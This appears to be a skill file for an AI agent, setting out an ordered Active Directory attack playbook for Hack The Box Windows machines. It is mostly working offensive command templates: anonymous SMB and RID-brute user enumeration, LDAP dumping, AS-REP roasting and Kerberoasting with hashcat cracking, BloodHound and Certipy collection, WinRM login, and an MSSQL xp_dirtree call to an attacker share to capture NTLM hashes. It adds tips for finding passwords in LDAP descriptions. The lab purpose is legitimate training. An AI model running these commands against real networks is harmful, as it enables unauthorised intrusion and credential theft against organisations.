---
name: ad-recon
description: Enumerate Active Directory services on a Windows target. Use when analyzing nmap/rustscan output, enumerating SMB shares, querying LDAP users, running rpcclient, AS-REP roasting, Kerberoasting, or starting recon on a new HTB Windows/AD machine.
user-invocable: false
allowed-tools: Read
---

# AD Recon

Follow this order. Check "Already Executed" in context before running anything.

## 1. Port scan
```
rustscan -a {IP} --ulimit 5000 -- -sC -sV
```
Key: 88=Kerberos(DC), 389/636=LDAP, 445=SMB, 5985=WinRM, 1433=MSSQL, 80/443=Web

## 2. SMB
```bash
netexec smb {IP} -u '' -p '' --shares           # null
netexec smb {IP} -u 'a' -p '' --shares          # some DCs need any user
netexec smb {IP} -u '{USER}' -p '{PASS}' --shares
netexec smb {IP} -u '' -p '' --rid-brute        # user enum without creds
netexec smb {IP} -u '{USER}' -p '{PASS}' -M spider_plus
```

## 3. LDAP
```bash
ldapsearch -x -H ldap://{IP} -b '' -s base namingContexts
netexec ldap {IP} -u '{USER}' -p '{PASS}' --users
ldapsearch -x -H ldap://{IP} -b 'DC=x,DC=x' '(objectClass=user)' description
ldapdomaindump -u '{DOMAIN}\{USER}' -p '{PASS}' {IP} -o ldap/
netexec ldap {IP} -u '{USER}' -p '{PASS}' --password-not-required
```
**Passwords in descriptions is the most common HTB credential find.**

## 4. RPC
```bash
rpcclient -U '' -N {IP} -c 'enumdomusers'
rpcclient -U '{USER}%{PASS}' {IP} -c 'enumdomusers;enumdomgroups;querydominfo'
```

## 5. Kerberos
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.txt
netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
kerbrute userenum --dc {IP} -d {DOMAIN} usernames.txt
```

## 6. BloodHound
```bash
rusthound-ce -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {IP} --zip   # ADCS data
bloodhound-ce-python -c all -d {DOMAIN} -u '{USER}' -p '{PASS}' -ns {IP} --zip
```

## 7. ADCS
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M adcs
certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -vulnerable -stdout
```

## 8. WinRM / MSSQL
```bash
evil-winrm -i {IP} -u '{USER}' -p '{PASS}'
impacket-mssqlclient {DOMAIN}/{USER}:'{PASS}'@{IP} -windows-auth
# Inside MSSQL: EXEC xp_dirtree '\\{ATTACKER}\share'  → Net-NTLMv2
```

## 9. Web
```bash
feroxbuster -u http://{IP} -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
ffuf -w subdomains.txt -u http://{IP} -H 'Host: FUZZ.{DOMAIN}' -fs {SIZE}
```

## Clock skew fix (Kerberos needs <5min)
```bash
sudo ntpdate {IP}
```

## Gotchas
- **Never skip web** — HTTP/HTTPS is often the intended entry point on HTB Windows boxes
- **LDAP descriptions** — check every user's description field, passwords are hidden there constantly
- **Pre-Win2000 accounts** — `passwordnotreqd=true` means password = lowercase hostname
- **MSSQL guest auth** — try `netexec mssql {IP} -u '' -p ''` before assuming creds needed
- **SMB null auth** — some DCs require a random username even for "null" session
- See references/ for detailed patterns per service

## Key References
- https://www.ired.team — AD attack mechanics
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://www.thehacker.recipes
- https://github.com/ly4k/Certipy/wiki — ADCS ESC1-16
- https://0xdf.gitlab.io — HTB AD writeups